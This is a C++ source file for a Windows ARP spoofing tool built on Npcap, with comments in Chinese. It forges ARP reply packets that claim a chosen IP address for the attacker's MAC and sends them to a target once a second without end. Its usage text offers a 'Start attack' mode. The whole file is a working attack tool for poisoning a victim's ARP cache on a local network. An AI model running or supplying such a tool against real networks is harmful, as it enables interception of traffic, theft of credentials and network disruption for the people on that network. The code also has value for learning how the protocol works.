
#include <iostream>
#include <regex>
#include <cctype>
#include <sstream>
#include "packet_struct.h"
#include "packet_tools.h"

using namespace std;

//构造一个ARP数据包
ARPPACKET createARPPacket(char* srcIP, char* desIP, char* srcMac, char* desMac) {

	
	//输出数据包的基本信息
	cout << " [-]start to make a ARP packet." << endl;
	cout << " [-]srcIP: " << srcIP << endl;
	cout << " [-]desIP: " << desIP << endl;
	cout << " [-]srcMac: " << srcMac << endl;
	cout << " [-]desMac: " << desMac << endl;
	
	ARPPACKET ARPPacket;
	//arp数据包类型为响应包
	int arpType = 02;

	//填充数据包
	mac_str_to_bin(srcMac, (char*)ARPPacket.etherHeader.ether_shost);
	mac_str_to_bin(desMac, (char*)ARPPacket.etherHeader.ether_dhost);
	ARPPacket.etherHeader.ether_type = htons((unsigned short)0x0806);
	ARPPacket.arpHeader.arp_hrd = htons((unsigned short)0x0001);
	ARPPacket.arpHeader.arp_pro = htons((unsigned short)0x0800);
	ARPPacket.arpHeader.arp_hln = (unsigned char)6;
	ARPPacket.arpHeader.arp_pln = (unsigned char)4;
	ARPPacket.arpHeader.arp_op = htons((unsigned short)arpType);
	mac_str_to_bin(srcMac, (char*)ARPPacket.arpHeader.arp_sourha);
	ARPPacket.arpHeader.arp_sourpa = inet_addr(srcIP);
	mac_str_to_bin(srcMac, (char*)ARPPacket.arpHeader.arp_destha);
	ARPPacket.arpHeader.arp_destpa = inet_addr(desIP);

	return ARPPacket;
}

//检测输入的参数是否是MAC地址
bool isMac(char *mac) {

	regex regexp("^([0-9a-f]{2})(([/\s:][0-9a-f]{2}){5})$");
	if (regex_match(mac, regexp))
	{
		return true;
	}
	else
	{
		return false;
	}

}

//检测输入的参数是否是IP
bool isIP(char *ip) {

	regex regexp("^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$");
	if (regex_match(ip,regexp))
	{
		return true;
	}
	else
	{
		return false;
	}

}

//输出使用帮助
void printUsage(char * filename) {

	cout << endl;
	cout << " A tool perform arpspoof which depend on npcap just for fun and learning C++.:)" << endl;
	cout<< endl;
	cout << " Usage: " << endl;
	cout << " [*]List all interface:" << endl;
	cout << " "<<filename<<" list" << endl;
	cout << " [*]Start attack:" << endl;
	cout <<" "<<filename<<" <ifaceNum> <fakeIP> <targetIP> <localMAC> <targetMAC> " << endl;

}


int main(int argc,char* argv[])
{
	
	pcap_if_t* alldevs;

	//设置Npcap DLL路径
	if (!LoadNpcapDlls()) {
		cout << " [*]Npcap load faild." << endl;
		return -1;
	}

	//显示网卡列表
	if (argc==2&&(strcmp(argv[1],"list")==0))
	{
		alldevs = findAlldevs();
		listDevs(alldevs);
		pcap_freealldevs(alldevs);
		return 0;
	}else if (argc == 6) {
		char* ifacenums = argv[1];
		char* fakeip = argv[2];
		char* targetip = argv[3];
		char* localmac = argv[4];
		char* targetmac = argv[5];

		//C++真香
		int ifacenum;
		stringstream ss;
		ss << ifacenums;
		ss >> ifacenum;

		alldevs = findAlldevs();
		map<int, char*> devslist = makeIflistmap(alldevs);

		cout << " [-]targetmac: " << targetmac << endl;
		cout << " [-]localmac: " << localmac << endl;
		cout << " [-]fakeip: " << fakeip << endl;
		cout << " [-]targetip: " << targetip << endl;


		if (!isMac(targetmac)||!isMac(localmac)||!isIP(fakeip)||!isIP(targetip)) {

			cout << " [X]Mac or IP error" << endl;
			return -3;
		
		}

		cout<<" [-]ifacenum is: " << ifacenum<<endl;

		char errbuf[PCAP_ERRBUF_SIZE];
		
		//两种函数都可以，至少对发包来说区别不大
		//pcap_t* ifaceh = pcap_open(devslist[ifacenum],100,PCAP_OPENFLAG_PROMISCUOUS,1000,NULL,errbuf);
		cout << " [-]iface name is: "<<devslist[ifacenum] << endl;
		pcap_t* ifaceh = pcap_open_live(devslist[ifacenum],65536,1,1000,errbuf);
		if (ifaceh==NULL)
		{
			cout<<" [X]interface open faild."<<endl;
			return -4;
		}
		

		ARPPACKET arpp = createARPPacket(fakeip,targetip,localmac,targetmac);
		cout<< " [-]packet length is: " << sizeof(arpp) << endl;

		cout << " [!]Press enter to start.";
		getchar();
		try
		{
			while (true)
			{
				//深坑，调了一上午，终于发现这个地方写错了，少了个括号，传入了一个bool值，应该是个0 :)
				//if (pcap_sendpacket(ifaceh, (const u_char*)& arpp, sizeof(arpp) != 0))
				if (pcap_sendpacket(ifaceh, (const u_char*)& arpp, sizeof(arpp)) != 0)
				{
					cout << pcap_geterr(ifaceh) << endl;
					return -5;
				}
				else
				{
					cout << " [!]send success." << endl;
					Sleep(1000);
				}

			}
		}
		catch (const std::exception&)
		{
			cout << " [X]There's something wrong." << endl;
			pcap_freealldevs(alldevs);
			return -5;
		}

		pcap_freealldevs(alldevs);

	}
	else
	{
		printUsage(argv[0]);
	}


	return 0;
}